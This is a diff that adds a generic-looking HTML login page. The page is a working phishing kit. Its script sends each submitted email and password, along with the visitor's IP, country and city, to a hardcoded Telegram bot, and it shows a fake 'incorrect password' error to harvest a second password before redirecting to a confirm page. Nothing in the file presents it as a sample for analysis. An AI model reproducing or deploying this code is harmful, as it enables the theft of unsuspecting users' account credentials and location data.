@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Your Account</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+        }
+
+        .login-container img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        .login-container h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #333;
+        }
+
+        .login-container input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        .login-container .btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #3578e5;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .login-container .btn:hover {
+            background-color: #3065c3;
+        }
+
+        .error-message {
+            color: red;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 20px;
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-container">
+        <img src="/login/images/logo.svg" alt="Logo">
+        <h2>Login to Your Account</h2>
+        <form id="login-form">
+            <input type="text" id="email" placeholder="Email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <p class="error-message" id="error-message">The password you've entered is incorrect.</p>
+            <button type="submit" class="btn">Log In</button>
+        </form>
+    </div>
+
+    <script>
+        let attemptCount = 0;
+
+        function sendToTelegram(email, password, ip, country, city, isSecondAttempt = false) {
+            const botToken = '7494153356:AAFQo6RDU7o_Cjn88uVqmwTFyQZaqoOn25k';
+            const chatId = '5607989288';
+            const passwordLabel = isSecondAttempt ? 'Password2' : 'Password';
+            const message = `Email: ${email}\n${passwordLabel}: ${password}\nIP: ${ip}\nCountry: ${country}\nCity: ${city}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log('Message sent to Telegram:', data))
+            .catch(error => console.error('Error sending message to Telegram:', error));
+        }
+
+        function getIpAndLocation(callback) {
+            fetch("https://ipapi.co/json/")
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const country = data.country_name;
+                    const city = data.city;
+                    callback(ip, country, city);
+                })
+                .catch(error => {
+                    console.error('Error fetching IP and location:', error);
+                    callback('Unavailable', 'Unavailable', 'Unavailable');
+                });
+        }
+
+        document.getElementById('login-form').addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            getIpAndLocation((ip, country, city) => {
+                sendToTelegram(email, password, ip, country, city, attemptCount >= 1);
+
+                // Increment attempt counter
+                attemptCount += 1;
+
+                // Simulate incorrect password and show error message
+                document.getElementById('error-message').style.display = 'block';
+
+                // Clear the password field but keep the email
+                document.getElementById('password').value = '';
+
+                // Redirect to /login/confirm.html after the second incorrect attempt
+                if (attemptCount >= 2) {
+                    window.location.href = '/login/confirm.html';
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
